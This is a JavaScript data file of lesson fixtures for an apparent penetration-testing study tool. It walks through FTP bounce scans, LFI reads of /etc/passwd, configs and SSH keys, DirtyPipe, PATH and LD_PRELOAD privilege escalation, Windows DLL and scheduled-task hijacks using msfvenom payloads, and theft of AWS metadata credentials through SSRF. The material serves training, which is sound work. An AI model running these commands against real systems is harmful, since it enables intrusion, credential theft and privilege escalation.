          { title: "Test the PORT command", tool: "ftp", where: "target", cmd: "quote PORT 172,16,5,10,0,3306", out: "200 PORT command successful.", sig: "200 PORT command successful.", teach: "A 200 means the server will open data connections where you tell it; a 500 means the bounce is blocked and this path is closed." } ] }
      ],
      how: { lead: "A bounce is confirm a login, confirm the PORT command, then let nmap scan through the server.", items: [
        { t: "Confirm a login", d: "You need to be authenticated to issue PORT, but anonymous almost always suffices on a bounce-capable server.", demo: [ { run: "ftp <target>", out: "230 Login successful.", sig: "230 Login successful." } ], note: "No anonymous and no credential means no bounce; move on." },
        { t: "Test the PORT command", d: "Issue a raw PORT aimed at an internal host and port. A 200 is a green light; a 500 or 501 means the server refuses redirected data connections.", demo: [ { run: "quote PORT 172,16,5,10,0,3306", out: "200 PORT command successful.", sig: "200 PORT command successful." } ], note: "The last two numbers encode the port: 0,3306 means high-byte 0 times 256 plus 3306." },
        { t: "Scan through it", d: "nmap -b wraps the whole dance. Point it at the FTP server for the bounce and at the internal host for the target.", demo: [ { run: "nmap -b anonymous:anonymous@<target> -p 1-1000 172.16.5.10", out: "3306/tcp open   mysql\n8080/tcp open   http-proxy", sig: "3306/tcp open   mysql" } ], note: "The open ports on the internal host are your pivot shortlist; chase the service you know how to attack." }
      ] },
      situation: "An anonymous FTP server on 10.10.10.10 accepts the PORT command, and 172.16.5.10 is unreachable from your box. What is the move?",
      choices: ["ftp-bounce", "recon-ftp", "ftp-upload-webshell", "online-brute-ftp"],
      coach: { "recon-ftp": "You already enumerated the FTP share; the new opportunity is bouncing a scan through it to an internal host you cannot otherwise reach.", "ftp-upload-webshell": "That needs a writable web root; here the lever is the PORT command, not an upload.", "online-brute-ftp": "You already have anonymous access, which is all the bounce needs; no brute required." }
    },
  
    'lfi-secret-harvest': {
      why: "A confirmed local file include is not the finish line, it is a read primitive, and the real work is turning arbitrary file reads into credentials. Start with the predictable files: /etc/passwd for usernames, service and application configs for database and app passwords, and SSH private keys under home directories. When the raw include executes or mangles PHP source, switch to the php://filter base64 wrapper to pull the source out cleanly and read the secrets inside. Everything you recover feeds the credential loop: a cracked hash, a reused password, or a key that logs you straight in. If the app also lets you write, log poisoning upgrades the read into code execution, but harvesting secrets is the dependable first move and often enough on its own.",
      cmd: "curl 'http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=config'",
      tool: "curl",
      output: "PD9waHAKJGRiX3VzZXIgPSAnd2ViYXBwJzsKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=",
      signal: "PD9waHA",
      teach: "The base64 wrapper returned the config source without executing it. Decode it (base64 -d) and the database username and password are in cleartext inside, a candidate you can reuse against other services or feed to the cracker.",
      leadup: [
        { key: "lfi", label: "The LFI is confirmed", steps: [
          { title: "Read a known file", tool: "curl", where: "local", cmd: "curl 'http://<target>/index.php?page=../../../../etc/passwd'", out: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", sig: "root:x:0:0:root", teach: "A clean /etc/passwd read proves the include reaches the filesystem; now aim it at files that hold secrets." } ] },
        { key: "wrapper", label: "PHP source came back blank", steps: [
          { title: "The include executed the source", tool: "curl", where: "local", cmd: "curl 'http://<target>/index.php?page=config.php'", out: "<html><body>Welcome back</body></html>", sig: "<html><body>Welcome back</body></html>", teach: "A rendered page with no PHP in it means the server executed the file instead of printing it; the php://filter wrapper pulls the raw source instead." } ] }
      ],
      how: { lead: "Harvesting is a tour of the files a web user can read: system accounts, app config, keys, then into the credential loop.", items: [
        { t: "Read the obvious files", d: "Start with /etc/passwd for user names and shells, then /etc/hosts and any app path you can guess. These confirm the read and name your targets.", demo: [ { run: "curl 'http://<target>/index.php?page=../../../../etc/passwd'", out: "root:x:0:0:root:/root:/bin/bash", sig: "root:x:0:0:root" } ], note: "The users with real shells are the accounts worth a password or a key." },
        { t: "Pull PHP source with the filter wrapper", d: "When the include runs the source instead of printing it, php://filter base64-encodes the file so you get the raw bytes, config secrets and all.", demo: [ { run: "curl 'http://<target>/index.php?page=php://filter/convert.base64-encode/resource=config'", out: "PD9waHAKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=", sig: "PD9waHA" } ], note: "Decode with base64 -d; database and API credentials live in these config files." },
        { t: "Grab SSH keys", d: "A readable private key under a home directory is a direct login. Try the users you found in /etc/passwd.", demo: [ { run: "curl 'http://<target>/index.php?page=../../../../home/j.smith/.ssh/id_rsa'", out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA", sig: "BEGIN OPENSSH PRIVATE KEY" } ], note: "Save it, chmod 600, and ssh in as that user; a passphrase can be cracked with ssh2john." },
        { t: "Feed the loot into the loop", d: "Decode configs, identify any hash, then crack or reuse. A recovered password often unlocks SSH, the database, or an admin panel elsewhere on the box.", note: "This is why LFI matters: it does not run code, but it hands you the credentials that do." }
      ] },
      situation: "You confirmed an LFI on a PHP app that reads files as www-data. What turns the read into access?",
      choices: ["lfi-secret-harvest", "lfi-probe", "file-upload", "command-injection"],
      coach: { "lfi-probe": "That is how you confirmed the LFI; now harvest the configs, keys, and hashes it can read.", "file-upload": "No upload form is in play; your primitive is the include reading files, not writing them.", "command-injection": "The include reads files, it does not run commands yet; harvest secrets, or try log poisoning as a separate step." }
    }
  };
  Object.keys(GAPFILL).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL[k]; });

  // --- Phase-6 gap-fill: the five privesc radar modules + the cloud post-exploitation path ---
  var GAPFILL2 = {
    "linux-kernel-exploit": {
      "why": "A kernel exploit is the last resort, not the first, because it can crash the box and cost you the session, but when the misconfiguration checks come up empty a vulnerable kernel is still a clean path to root. The job is matching: read the exact kernel version and distribution, feed them to an exploit-suggester, and only fire a public exploit whose preconditions you actually meet. Modern labs lean on a handful of reliable ones, PwnKit (pkexec), DirtyPipe, Sudo Baron Samedit, and the odd DirtyCow box, so recognise them on sight. Compile on a matching box or use a prebuilt static binary, and read the exploit before you run it so a reboot is a choice, not a surprise.",
      "cmd": "uname -a",
      "tool": "sh",
      "output": "Linux target 5.8.0-53-generic #60-Ubuntu SMP x86_64 GNU/Linux",
      "signal": "5.8.0-53-generic",
      "teach": "Kernel 5.8.0 on Ubuntu is in range for DirtyPipe (CVE-2022-0847) and PwnKit. Run an exploit-suggester to confirm the match, then compile and run the one whose preconditions you meet.",
      "leadup": [
        {
          "key": "foothold",
          "label": "You have a shell",
          "steps": [
            {
              "title": "Confirm who you are",
              "tool": "sh",
              "where": "target",
              "cmd": "id",
              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
              "sig": "uid=1000(bob)",
              "teach": "You are an unprivileged user; after the misconfiguration checks come up empty, the kernel is the next lead."
            }
          ]
        },
        {
          "key": "enum",
          "label": "Misconfig checks found nothing",
          "steps": [
            {
              "title": "No sudo, no SUID, no cron",
              "tool": "sh",
              "where": "target",
              "cmd": "sudo -l 2>/dev/null; echo done",
              "out": "done",
              "sig": "done",
              "teach": "Nothing in sudo, SUID, caps, or cron. A vulnerable kernel is now worth the risk; identify it precisely first."
            }
          ]
        }
      ],
      "how": {
        "lead": "Kernel LPE is identify, match, read, run. Never fire blind, a mismatched exploit panics the box.",
        "items": [
          {
            "t": "Read the kernel and distro exactly",
            "d": "The exploit has to match both the kernel version and the distribution. uname -a and the release file give you both.",
            "demo": [
              {
                "run": "uname -r; cat /etc/os-release | head -1",
                "out": "5.8.0-53-generic\nPRETTY_NAME=\"Ubuntu 20.04.2 LTS\"",
                "sig": "5.8.0-53-generic"
              }
            ],
            "note": "Write both down; an Ubuntu 20.04 exploit will not run on a Debian kernel of the same number."
          },
          {
            "t": "Run an exploit-suggester",
            "d": "linux-exploit-suggester.sh (or the Metasploit local_exploit_suggester) ranks public exploits by how well your kernel matches, so you are not guessing.",
            "demo": [
              {
                "run": "./linux-exploit-suggester.sh",
                "out": "[+] [CVE-2022-0847] DirtyPipe\n   Exposure: highly probable\n[+] [CVE-2021-4034] PwnKit\n   Exposure: probable",
                "sig": "[CVE-2022-0847] DirtyPipe"
              }
            ],
            "note": "Highly probable means the version and config line up; start there."
          },
          {
            "t": "Read the exploit, then run it",
            "d": "Read the source for what it does and whether it reboots. PwnKit needs pkexec present; DirtyPipe needs a readable SUID to overwrite. Prefer a self-contained binary.",
            "demo": [
              {
                "run": "./dirtypipe",
                "out": "Hijacking SUID binary..\nRestoring /usr/bin/su..\n# id",
                "sig": "# id"
              }
            ],
            "note": "The hash prompt is a root shell; DirtyPipe restores the binary it borrowed, so it is one of the cleaner ones."
          },
          {
            "t": "Prove root",
            "d": "Confirm the shell is uid 0 before you do anything else, then capture the flag.",
            "demo": [
              {
                "run": "id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "uid=0 is root; the escalation is done."
          }
        ]
      },
      "situation": "You have an unprivileged shell on a Linux box, sudo -l is empty, and there are no SUID, capability, or cron leads. uname shows 5.8.0. What is the move?",
      "choices": [
        "linux-kernel-exploit",
        "sudo-abuse",
        "suid-gtfobins",
        "linux-enum"
      ],
      "coach": {
        "sudo-abuse": "sudo -l already came up empty, so there is no sudo right to abuse here.",
        "suid-gtfobins": "You already checked SUID binaries and found nothing abusable; the kernel is the remaining lead.",
        "linux-enum": "You already enumerated; with the misconfig paths exhausted, a matched kernel exploit is the next step."
      }
    },
    "linux-path-hijack": {
      "why": "A root SUID binary or a root cron job that calls another program by its bare name, not its full path, is handing you root. The shell searches PATH to resolve that name, so if you can put a directory you control at the front of PATH and drop a program with the same name in it, your program runs with the caller's privileges. The whole technique is noticing the relative call: a custom SUID binary that runs backup instead of /usr/bin/backup, or a cron script that calls tar without a path. Find it with strings or ltrace on the binary, then it is three commands to a root shell.",
      "cmd": "strings /usr/local/bin/backup",
      "tool": "sh",
      "output": "Starting backup...\nbackup\ntar czf /opt/backup.tgz /home",
      "signal": "\nbackup\n",
      "teach": "The SUID binary calls backup by bare name, not /usr/bin/backup, so it resolves through PATH. Put a writable directory first in PATH, drop a backup program there, and run the SUID binary to execute yours as root.",
      "leadup": [
        {
          "key": "suid",
          "label": "You found a custom SUID binary",
          "steps": [
            {
              "title": "List SUID binaries",
              "tool": "sh",
              "where": "target",
              "cmd": "find / -perm -4000 -type f 2>/dev/null",
              "out": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup",
              "sig": "/usr/local/bin/backup",
              "teach": "A non-standard SUID binary (backup) is worth inspecting; the stock ones rarely help."
            }
          ]
        },
        {
          "key": "relative",
          "label": "It calls a command by bare name",
          "steps": [
            {
              "title": "Trace what it runs",
              "tool": "sh",
              "where": "target",
              "cmd": "ltrace /usr/local/bin/backup 2>&1 | grep -i exec",
              "out": "system(\"backup\")",
              "sig": "system(\"backup\")",
              "teach": "system(\"backup\") with no slash means PATH decides which backup runs; that is your hook."
            }
          ]
        }
      ],
      "how": {
        "lead": "PATH hijack is find the relative call, point PATH at a directory you own, drop your binary, trigger it.",
        "items": [
          {
            "t": "Confirm the call is relative",
            "d": "strings or ltrace on the SUID binary (or reading the cron script) shows whether it calls a program by bare name. A leading slash means no hijack.",
            "demo": [
              {
                "run": "strings /usr/local/bin/backup | grep -v /",
                "out": "backup",
                "sig": "backup"
              }
            ],
            "note": "A bare word with no slash is the vulnerable call."
          },
          {
            "t": "Build your replacement",
            "d": "Write a tiny program with the hijacked name that spawns a shell, make it executable, and put it in a directory you can write.",
            "demo": [
              {
                "run": "echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/backup && chmod +x /tmp/backup",
                "out": "",
                "sig": ""
              }
            ],
            "note": "bash -p keeps the elevated privileges instead of dropping them."
          },
          {
            "t": "Put your directory first in PATH",
            "d": "Prepend /tmp (or wherever your binary lives) so the shell finds yours before the real one.",
            "demo": [
              {
                "run": "export PATH=/tmp:$PATH; which backup",
                "out": "/tmp/backup",
                "sig": "/tmp/backup"
              }
            ],
            "note": "which confirms your copy wins the search."
          },
          {
            "t": "Trigger it and confirm root",
            "d": "Run the SUID binary (or wait for the cron). It calls backup, finds yours, and runs it with its privileges.",
            "demo": [
              {
                "run": "/usr/local/bin/backup; id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "A root shell; the hijack worked."
          }
        ]
      },
      "situation": "A root-owned SUID binary calls backup by its bare name, and /tmp is writable. What is the move?",
      "choices": [
        "linux-path-hijack",
        "suid-gtfobins",
        "cron-abuse",
        "linux-enum"
      ],
      "coach": {
        "suid-gtfobins": "This binary is custom, not a GTFOBins entry; the win is its relative call, not a known abuse.",
        "cron-abuse": "It is a SUID binary you run on demand, not a cron job; the PATH hijack fires when you run it.",
        "linux-enum": "You already found the lead; now exploit the relative PATH call."
      }
    },
    "linux-ld-preload": {
      "why": "When sudo is configured to preserve LD_PRELOAD (env_keep += LD_PRELOAD in the policy), any command you are allowed to run with sudo will load a shared library you point it at, with root privileges. You write a tiny .so whose constructor resets the user id to 0 and drops a shell, then run the permitted sudo command with LD_PRELOAD set to your library. The tell is in sudo -l: look for env_keep carrying LD_PRELOAD or LD_LIBRARY_PATH. It is a clean, reliable root when that one misconfiguration is present, and it does not matter which command you are allowed to run.",
      "cmd": "sudo -l",
      "tool": "sh",
      "output": "Matching Defaults entries for bob:\n    env_reset, env_keep+=LD_PRELOAD\nUser bob may run the following commands:\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
      "signal": "env_keep+=LD_PRELOAD",
      "teach": "sudo preserves LD_PRELOAD, so any allowed sudo command loads a library you choose as root. Compile a .so that sets uid 0 and spawns a shell, then run apache2ctl under sudo with LD_PRELOAD pointed at it.",
      "leadup": [
        {
          "key": "sudo",
          "label": "sudo -l shows an env_keep",
          "steps": [
            {
              "title": "Read the sudo policy",
              "tool": "sh",
              "where": "target",
              "cmd": "sudo -l",
              "out": "env_reset, env_keep+=LD_PRELOAD\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
              "sig": "env_keep+=LD_PRELOAD",
              "teach": "The preserved LD_PRELOAD is the whole vulnerability; the specific allowed command barely matters."
            }
          ]
        },
        {
          "key": "compiler",
          "label": "A compiler is available",
          "steps": [
            {
              "title": "Is gcc present",
              "tool": "sh",
              "where": "target",
              "cmd": "which gcc cc 2>/dev/null",
              "out": "/usr/bin/gcc",
              "sig": "/usr/bin/gcc",
              "teach": "gcc lets you build the .so on the box; otherwise cross-compile a matching one and upload it."
            }
          ]
        }
      ],
      "how": {
        "lead": "LD_PRELOAD abuse is confirm the env_keep, build a constructor .so, run the allowed sudo command with LD_PRELOAD set.",
        "items": [
          {
            "t": "Confirm LD_PRELOAD is preserved",
            "d": "sudo -l must show env_keep carrying LD_PRELOAD (or LD_LIBRARY_PATH). Without it, sudo strips the variable and this does nothing.",
            "demo": [
              {
                "run": "sudo -l | grep -i ld_preload",
                "out": "env_reset, env_keep+=LD_PRELOAD",
                "sig": "env_keep+=LD_PRELOAD"
              }
            ],
            "note": "LD_LIBRARY_PATH works the same way with a slightly different payload."
          },
          {
            "t": "Write the library",
            "d": "A C file with a constructor that sets the real and effective uid to 0 and execs a shell. Compile it as a shared object.",
            "demo": [
              {
                "run": "gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles",
                "out": "",
                "sig": ""
              }
            ],
            "note": "The constructor runs the instant the library loads, before the real program does anything."
          },
          {
            "t": "Run the allowed command with your library",
            "d": "Invoke the permitted sudo command, setting LD_PRELOAD to your .so. sudo keeps the variable, the library loads as root, and your constructor fires.",
            "demo": [
              {
                "run": "sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl",
                "out": "# id",
                "sig": "# id"
              }
            ],
            "note": "The command you run is irrelevant; the library elevates before it starts."
          },
          {
            "t": "Confirm root",
            "d": "Check the shell is uid 0, then capture the flag.",
            "demo": [
              {
                "run": "id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "Root via one preserved environment variable."
          }
        ]
      },
      "situation": "sudo -l shows env_keep+=LD_PRELOAD and one NOPASSWD command, and gcc is on the box. What is the move?",
      "choices": [
        "linux-ld-preload",
        "sudo-abuse",
        "suid-gtfobins",
        "linux-enum"
      ],
      "coach": {
        "sudo-abuse": "The allowed command is not itself GTFOBins-abusable; the preserved LD_PRELOAD is the actual hole.",
        "suid-gtfobins": "This is a sudo env misconfiguration, not a SUID binary.",
        "linux-enum": "You already found the env_keep lead; now build the .so and use it."
      }
    },
    "windows-dll-hijack": {
      "why": "A privileged process that loads a DLL by name, from a directory you can write or from a path where the DLL is missing, will load yours instead and run your code as that process. Windows searches a fixed order of directories for a DLL, and when a high-privilege service looks in a writable folder first, or looks for a DLL that is not there (a phantom DLL), you drop a malicious one and get its privileges on the next start. You find it with Procmon, watching for a NAME NOT FOUND or a load from a writable path, then plant a DLL whose entry point runs your payload. It is a quieter escalation than swapping a service binary and it survives patches that only fix known services.",
      "cmd": "icacls \"C:\\Program Files\\VulnApp\"",
      "tool": "cmd",
      "output": "C:\\Program Files\\VulnApp BUILTIN\\Users:(OI)(CI)(M)\n                       NT AUTHORITY\\SYSTEM:(OI)(CI)(F)",
      "signal": "BUILTIN\\Users:(OI)(CI)(M)",
      "teach": "Users have Modify (M) on the app directory, and its SYSTEM service loads a DLL from there. Drop a malicious DLL with the name the service expects and restart it to run as SYSTEM.",
      "leadup": [
        {
          "key": "service",
          "label": "A service runs as SYSTEM",
          "steps": [
            {
              "title": "Find a non-default service",
              "tool": "cmd",
              "where": "target",
              "cmd": "sc qc VulnAppSvc",
              "out": "SERVICE_START_NAME   : LocalSystem\nBINARY_PATH_NAME     : C:\\Program Files\\VulnApp\\svc.exe",
              "sig": "SERVICE_START_NAME   : LocalSystem",
              "teach": "A third-party service running as LocalSystem is the prize; now check whether you can influence what it loads."
            }
          ]
        },
        {
          "key": "procmon",
          "label": "Procmon shows a hijackable load",
          "steps": [
            {
              "title": "Watch its DLL loads",
              "tool": "procmon",
              "where": "target",
              "cmd": "Procmon filter: Process is svc.exe, Result is NAME NOT FOUND, Path ends with .dll",
              "out": "svc.exe  CreateFile  C:\\Program Files\\VulnApp\\config.dll  NAME NOT FOUND",
              "sig": "NAME NOT FOUND",
              "teach": "The service looks for config.dll in a folder you can write and does not find it; that missing DLL is your slot."
            }
          ]
        }
      ],
      "how": {
        "lead": "DLL hijack is find a privileged load from a writable or missing path, plant a DLL with that name, restart the process.",
        "items": [
          {
            "t": "Find the writable load",
            "d": "Procmon with a NAME NOT FOUND filter on the target process shows DLLs it tries to load and cannot, or loads from a writable directory. Confirm you can write that directory with icacls.",
            "demo": [
              {
                "run": "icacls \"C:\\Program Files\\VulnApp\"",
                "out": "BUILTIN\\Users:(OI)(CI)(M)",
                "sig": "BUILTIN\\Users:(OI)(CI)(M)"
              }
            ],
            "note": "(M) or (F) for Users or Everyone means you can drop the DLL there."
          },
          {
            "t": "Build the DLL",
            "d": "Compile a DLL whose DllMain runs your payload on attach. msfvenom produces one that adds an admin or returns a shell.",
            "demo": [
              {
                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators bob /add\" -f dll -o config.dll",
                "out": "Saved as: config.dll",
                "sig": "Saved as: config.dll"
              }
            ],
            "note": "Keep the payload quick; DllMain should not block the host process."
          },
          {
            "t": "Plant it with the expected name",
            "d": "Copy your DLL into the writable directory using the exact name the process looked for.",
            "demo": [
              {
                "run": "copy config.dll \"C:\\Program Files\\VulnApp\\config.dll\"",
                "out": "        1 file(s) copied.",
                "sig": "1 file(s) copied."
              }
            ],
            "note": "The name must match exactly what Procmon showed."
          },
          {
            "t": "Restart the service and confirm",
            "d": "Restart the service (or reboot, or wait for its trigger). It loads your DLL as SYSTEM and runs your payload.",
            "demo": [
              {
                "run": "sc stop VulnAppSvc & sc start VulnAppSvc & whoami",
                "out": "nt authority\\system",
                "sig": "nt authority\\system"
              }
            ],
            "note": "A SYSTEM context confirms the hijack; capture proof."
          }
        ]
      },
      "situation": "A LocalSystem service loads config.dll from C:\\Program Files\\VulnApp, Procmon shows NAME NOT FOUND, and Users have Modify on that folder. What is the move?",
      "choices": [
        "windows-dll-hijack",
        "weak-service-permissions",
        "unquoted-service-path",
        "windows-enum"
      ],
      "coach": {
        "weak-service-permissions": "You cannot reconfigure the service itself here; the lever is the DLL it loads from a writable path.",
        "unquoted-service-path": "The binary path is quoted; the weakness is the missing DLL, not the path parsing.",
        "windows-enum": "You already found the hijackable load; now plant the DLL."
      }
    },
    "windows-schtask-abuse": {
      "why": "A scheduled task that runs as SYSTEM or an administrator, and executes a program or script in a location you can write, is a direct path to its privileges. You overwrite the file the task runs, then wait for its trigger or start it yourself, and your code runs elevated. The tell is in schtasks /query /v: a task whose Run As User is SYSTEM and whose Task To Run points at a writable path, or a task whose own file ACL lets you edit it. Check the target with icacls before you touch it, and keep a copy of the original so the box still works afterward.",
      "cmd": "schtasks /query /v /fo LIST",
      "tool": "cmd",
      "output": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat\nSchedule:      At 02:00 every day",
      "signal": "Run As User:   SYSTEM",
      "teach": "VulnBackup runs backup.bat as SYSTEM every day. If C:\\Scripts is writable, overwrite backup.bat with your payload and the task runs it as SYSTEM at the next trigger.",
      "leadup": [
        {
          "key": "task",
          "label": "A task runs as SYSTEM",
          "steps": [
            {
              "title": "List tasks with details",
              "tool": "cmd",
              "where": "target",
              "cmd": "schtasks /query /v /fo LIST | findstr /i \"TaskName Run Task\"",
              "out": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat",
              "sig": "Run As User:   SYSTEM",
              "teach": "A SYSTEM task pointing at a script is the lead; the question is whether you can edit what it runs."
            }
          ]
        },
        {
          "key": "acl",
          "label": "Its target is writable",
          "steps": [
            {
              "title": "Check the script ACL",
              "tool": "cmd",
              "where": "target",
              "cmd": "icacls C:\\Scripts\\backup.bat",
              "out": "C:\\Scripts\\backup.bat BUILTIN\\Users:(F)",
              "sig": "BUILTIN\\Users:(F)",
              "teach": "Full control for Users means you can overwrite the script the SYSTEM task runs."
            }
          ]
        }
      ],
      "how": {
        "lead": "Scheduled-task abuse is find a SYSTEM task with a writable target, back up the original, write your payload, trigger it.",
        "items": [
          {
            "t": "Find the SYSTEM task and its target",
            "d": "schtasks /query /v lists every task with its Run As User and the file it runs. You want SYSTEM or an admin, pointing at a path or file you can write.",
            "demo": [
              {
                "run": "schtasks /query /v /fo LIST | findstr /i \"Run As User\"",
                "out": "Run As User:   SYSTEM",
                "sig": "Run As User:   SYSTEM"
              }
            ],
            "note": "Also check tasks you can modify directly, not just their targets."
          },
          {
            "t": "Confirm you can write the target",
            "d": "icacls on the script or binary the task runs. Modify or Full for your user or Users is enough.",
            "demo": [
              {
                "run": "icacls C:\\Scripts\\backup.bat",
                "out": "BUILTIN\\Users:(F)",
                "sig": "BUILTIN\\Users:(F)"
              }
            ],
            "note": "If only the containing folder is writable, you may be able to replace the file wholesale."
          },
          {
            "t": "Back up, then write your payload",
            "d": "Copy the original aside, then overwrite the script with a command that gives you access (add an admin, or call a reverse shell).",
            "demo": [
              {
                "run": "copy C:\\Scripts\\backup.bat backup.bak & echo net localgroup administrators bob /add > C:\\Scripts\\backup.bat",
                "out": "        1 file(s) copied.",
                "sig": "1 file(s) copied."
              }
            ],
            "note": "Keeping the original means you can restore normal behaviour after you capture proof."
          },
          {
            "t": "Trigger it and confirm",
            "d": "Run the task now if you can, or wait for its schedule, then check your new privilege.",
            "demo": [
              {
                "run": "schtasks /run /tn \\VulnBackup & net localgroup administrators",
                "out": "Members\n-------\nAdministrator\nbob",
                "sig": "bob"
              }
            ],
            "note": "Your account in the administrators group confirms it; log in fresh to use the new rights."
          }
        ]
      },
      "situation": "schtasks shows a task running as SYSTEM that executes C:\\Scripts\\backup.bat, and icacls shows Users have Full control of that file. What is the move?",
      "choices": [
        "windows-schtask-abuse",
        "weak-service-permissions",
        "seimpersonate",
        "windows-enum"
      ],
      "coach": {
        "weak-service-permissions": "This is a scheduled task, not a service; the writable target is what you abuse.",
        "seimpersonate": "You have no SeImpersonate lead here; the SYSTEM task with a writable script is the direct path.",
        "windows-enum": "You already found the task; now overwrite its target and trigger it."
      }
    },
    "aws-credential-abuse": {
      "why": "Pulling temporary AWS keys out of the instance metadata service through an SSRF is only the start; the value is what those keys can do in the account. You load the access key, secret, and session token into the aws CLI, confirm who you are with sts get-caller-identity, then map your permissions and loot: list and read S3 buckets, pull secrets from Secrets Manager and SSM Parameter Store, and look for a privilege-escalation path like iam:PassRole, a writable Lambda, or ssm:SendCommand back onto the instance for a shell. This is beyond the OSCP syllabus, but it is exactly where a real modern engagement goes after a web SSRF, so it belongs on the map. The keys are temporary (an ASIA prefix), so note the session token is mandatory and the clock is running.",
      "cmd": "aws sts get-caller-identity",
      "tool": "aws",
      "output": "{\n    \"UserId\": \"AROAEXAMPLE:i-0abc123\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"\n}",
      "signal": "assumed-role/web-role",
      "teach": "The keys are valid and belong to web-role on the instance. Enumerate what that role can do (iam, s3, secretsmanager), then loot buckets and secrets or chain a role-assumption for more access.",
      "leadup": [
        {
          "key": "ssrf",
          "label": "SSRF reached the metadata service",
          "steps": [
            {
              "title": "Read the role credentials",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'",
              "out": "{\"AccessKeyId\":\"ASIAEXAMPLE123456789\",\"SecretAccessKey\":\"wJalr...\",\"Token\":\"IQoJb...\"}",
              "sig": "ASIAEXAMPLE123456789",
              "teach": "The SSRF returned temporary credentials; obol reads them as a cloud credential to try with the CLI."
            }
          ]
        },
        {
          "key": "configure",
          "label": "You loaded the keys",
          "steps": [
            {
              "title": "Set the environment",
              "tool": "aws",
              "where": "local",
              "cmd": "export AWS_ACCESS_KEY_ID=ASIAEXAMPLE123456789 AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQoJb...",
              "out": "",
              "out_note": "no output",
              "sig": "",
              "teach": "Temporary (ASIA) keys require the session token; without it every call fails with an auth error."
            }
          ]
        }
      ],
      "how": {
        "lead": "Cloud key abuse is confirm the identity, map the permissions, then loot and look for escalation.",
        "items": [
          {
            "t": "Confirm the keys work",
            "d": "sts get-caller-identity is the free, read-only call that proves the keys are valid and tells you which role you are.",
            "demo": [
              {
                "run": "aws sts get-caller-identity",
                "out": "\"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"",
                "sig": "assumed-role/web-role"
              }
            ],
            "note": "An error here means the token is missing or the keys expired; re-pull from the metadata service."
          },
          {
            "t": "Map what the role can do",
            "d": "Try the common services. You rarely have iam:ListRolePolicies, so probe by action: list buckets, list secrets, describe instances.",
            "demo": [
              {
                "run": "aws s3 ls; aws secretsmanager list-secrets --query 'SecretList[].Name'",
                "out": "2023-01-01 app-backups\n[\n    \"prod/db/password\"\n]",
                "sig": "prod/db/password"
              }
            ],
            "note": "A named secret like prod/db/password is often the whole game."
          },
          {
            "t": "Loot buckets and secrets",
            "d": "Pull the readable buckets and the secret values. Database passwords and API keys here frequently reuse onto the hosts you are attacking.",
            "demo": [
              {
                "run": "aws secretsmanager get-secret-value --secret-id prod/db/password --query SecretString",
                "out": "\"{\\\"user\\\":\\\"admin\\\",\\\"pass\\\":\\\"S3cr3tDbPass\\\"}\"",
                "sig": "S3cr3tDbPass"
              }
            ],
            "note": "Feed recovered credentials straight back into the credential loop."
          },
          {
            "t": "Look for an escalation path",
            "d": "iam:PassRole with a compute service, a writable Lambda, or ssm:SendCommand onto the instance can turn a limited role into code execution or a higher role.",
            "demo": [
              {
                "run": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-0abc123 --parameters 'commands=id'",
                "out": "\"CommandId\": \"a1b2c3d4\"",
                "sig": "CommandId"
              }
            ],
            "note": "SendCommand onto the instance runs as root/SYSTEM via the SSM agent; that is your shell on the box."
          }
        ]
      },
      "situation": "An SSRF pulled temporary AWS keys (ASIA...) from the instance metadata service. What turns them into access?",
      "choices": [
        "aws-credential-abuse",
        "ssrf",
        "content-discovery",
        "crack-identify"
      ],
      "coach": {
        "ssrf": "The SSRF is how you got the keys; now use them with the aws CLI to enumerate and loot the account.",
        "content-discovery": "You are past the web app now; the next surface is the cloud account the keys belong to.",
        "crack-identify": "These are live temporary keys, not a hash to crack; load them into the CLI and use them."
      }
    }
  };
  Object.keys(GAPFILL2).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL2[k]; });

  // --- Phase-A gap-fill: Windows patch-gap exploitation + SCCM exploitation ---
  var GAPFILL3 = {
    "windows-patch-exploit": {
      "why": "A Windows host missing a patch hands you SYSTEM through a public exploit, exactly as a vulnerable Linux kernel does. wesng (offline, against systeminfo) or Watson (on-box) compares the installed hotfixes to the patch database and names the missing ones that carry a known local exploit. The discipline is the same as the Linux side: confirm the exact build, match a public PoC to a named KB or CVE, read it, and run a precompiled binary where you can so a bad compile does not burn the session. The exam-relevant set is small (the secondary-logon and printing bugs, the token ones), so learn to spot them straight from systeminfo.",
      "cmd": "systeminfo",
      "tool": "cmd",
      "output": "OS Name:        Microsoft Windows Server 2016 Standard\nOS Version:     10.0.14393 N/A Build 14393\nHotfix(s):      3 Hotfix(s) Installed.",
      "signal": "Build 14393",
      "teach": "Build 14393 with only three hotfixes is badly behind. Feed systeminfo to wesng (or run Watson on-box) to name a missing KB with a public local exploit, then run the matched, precompiled PoC and confirm SYSTEM.",
      "leadup": [
